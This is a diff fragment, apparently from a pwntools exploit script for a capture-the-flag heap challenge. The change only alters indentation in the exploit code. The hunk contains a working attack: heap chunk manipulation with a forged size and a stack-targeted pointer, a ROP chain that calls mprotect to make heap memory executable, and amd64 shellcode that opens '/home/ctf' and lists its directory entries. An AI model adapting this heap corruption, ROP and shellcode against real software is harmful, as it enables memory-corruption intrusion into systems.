@@ -101,27 +101,27 @@ if __name__=="__main__":
         delete(0)
         delete(12)
         shellcode = asm(f"""
-								xor rax,2
-								mov rdi,{heap_base+0x930}
-								mov rsi,0
-								syscall
-								mov rdi, rax
-								mov rsi, {heap_base}
-								mov rdx, 0x100
-								mov rax, 0x4e
-								syscall
-								mov rdi, 1
-								mov rax, 1
-								syscall
-				""",arch="amd64")
+		xor rax,2
+		mov rdi,{heap_base+0x930}
+		mov rsi,0
+		syscall
+		mov rdi, rax
+		mov rsi, {heap_base}
+		mov rdx, 0x100
+		mov rax, 0x4e
+		syscall
+		mov rdi, 1
+		mov rax, 1
+		syscall
+	""",arch="amd64")
         alloc(0x198,shellcode.ljust(0x118,b"A")+p64(0x81)+p64(stack_leak-0x120)) #0
         alloc(0x78,"/home/ctf\0") #1
         L_ROP = p64(libc_base+L_pop_rdi)+p64(heap_base)+\
-								p64(libc_base+L_pop_rsi)+p64(0x1000)+\
-								p64(libc_base+L_pop_rdx)+p64(7)+p64(0)+\
-								p64(libc_base+L_pop_rax)+p64(0xa)+\
-								p64(libc_base+L_syscall)+\
-								p64(heap_base+0x810)
+		p64(libc_base+L_pop_rsi)+p64(0x1000)+\
+		p64(libc_base+L_pop_rdx)+p64(7)+p64(0)+\
+		p64(libc_base+L_pop_rax)+p64(0xa)+\
+		p64(libc_base+L_syscall)+\
+		p64(heap_base+0x810)
         alloc(0x78,L_ROP) #11
 
         io.interactive()
